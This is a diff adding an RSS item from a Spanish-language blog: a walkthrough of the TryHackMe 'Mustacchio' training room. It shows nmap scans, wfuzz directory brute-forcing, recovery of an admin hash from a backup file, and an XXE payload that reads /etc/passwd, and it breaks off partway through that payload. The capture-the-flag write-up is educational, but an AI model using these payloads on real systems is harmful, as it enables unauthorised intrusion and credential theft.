@@ -7,6 +7,381 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <lastBuildDate>Wed, 11 Jan 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Resolución Mustacchio</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-mustacchio/</link>
+        <pubDate>Wed, 11 Jan 2023 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-mustacchio/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-mustacchio/images/portada.png" alt="Featured image of post Resolución Mustacchio" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/mustacchio&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/mustacchio&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP Víctima = 10.10.3.160&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ping -c &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 10.10.131.18
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PING 10.10.131.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.131.18&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 56&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;84&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; bytes of data.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; bytes from 10.10.131.18: &lt;span class=&#34;nv&#34;&gt;icmp_seq&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ttl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;63&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;372&lt;/span&gt; ms
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--- 10.10.131.18 ping statistics ---
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; packets transmitted, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; received, 0% packet loss, &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; 0ms
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rtt min/avg/max/mdev &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 371.643/371.643/371.643/0.000 ms
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -p- --open -sS --min-rate &lt;span class=&#34;m&#34;&gt;5000&lt;/span&gt; -n -vvv -Pn 10.10.131.18 -oG allPorts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;❯ extractPorts allPorts
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;───────┬─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       │ File: extractPorts.tmp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;───────┼─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   │ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   │ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extracting information...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   │ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;   │     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; IP Address: 10.10.131.18
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;   │     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Open ports: 22,80,8765
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;   │ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;   │ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;   │ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;❯ nmap -p22,80,8765 -sC -sV 10.10.131.18
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT     STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 581b0c0ffacf05be4cc07af1f188611c &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 3cfce8a37e039a302c77e00a1ce452e6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 9d59c6c779c554c41daae4d184710192 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp   open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-robots.txt: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; disallowed entry 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Mustacchio &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Home
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;8765/tcp open  http    nginx 1.10.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Mustacchio &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Login
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: nginx/1.10.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;puerto-80&#34;&gt;Puerto 80&lt;/h2&gt;
+&lt;p&gt;Al entrar a la web lo primero que vemos es lo siguiente:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-mustacchio/images/1.png&#34;
+	width=&#34;1898&#34;
+	height=&#34;969&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;195&#34;
+		data-flex-basis=&#34;470px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Con wfuzz vamos a buscar subdirectorios&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://10.10.131.18/FUZZ
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Entre todos los que encuentra hay uno llamdo custom que dentro tiene una carpeta llamada js y css. Dentro de js hay un archivo llamado users.bak. Al descargarnoslo con un strings podemos ver un usuario (admin) y un hash&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-mustacchio/images/term1.png&#34;
+	width=&#34;694&#34;
+	height=&#34;105&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;660&#34;
+		data-flex-basis=&#34;1586px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Ese hash podemos probar de romperlo con la herramienta search the hash&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-mustacchio/images/term2.png&#34;
+	width=&#34;932&#34;
+	height=&#34;368&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;253&#34;
+		data-flex-basis=&#34;607px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;puerto-8765&#34;&gt;Puerto 8765&lt;/h2&gt;
+&lt;p&gt;Dentro de este puerto hay otra web con un panel de login al cual podemos entrar con las credenciales que hemos conseguido antes. Al entrar vemos lo siguiente:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-mustacchio/images/3.png&#34;
+	width=&#34;905&#34;
+	height=&#34;733&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;123&#34;
+		data-flex-basis=&#34;296px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Si lo dejamos en blanco sale una notificación que dice que tenemos que poner código XML&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-mustacchio/images/4.png&#34;
+	width=&#34;1134&#34;
+	height=&#34;767&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;147&#34;
+		data-flex-basis=&#34;354px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Viendo que abajo salen tres variables (Nombre, Autor y Comentario) podemos probar de poner un código XML con esos apartados.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;comment&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;test1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;author&amp;gt;&lt;/span&gt;test2&lt;span class=&#34;nt&#34;&gt;&amp;lt;/author&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;com&amp;gt;&lt;/span&gt;test3&lt;span class=&#34;nt&#34;&gt;&amp;lt;/com&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/comment&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-mustacchio/images/5.png&#34;
+	width=&#34;295&#34;
+	height=&#34;207&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;142&#34;
+		data-flex-basis=&#34;342px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Podemos probar de hacer una inyeccion xxe con el siguiente código xml para que muestre el archivo /etc/passwd&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY testxxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;&lt;/span&gt; ]&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;comment&amp;gt;&lt;/span&gt;
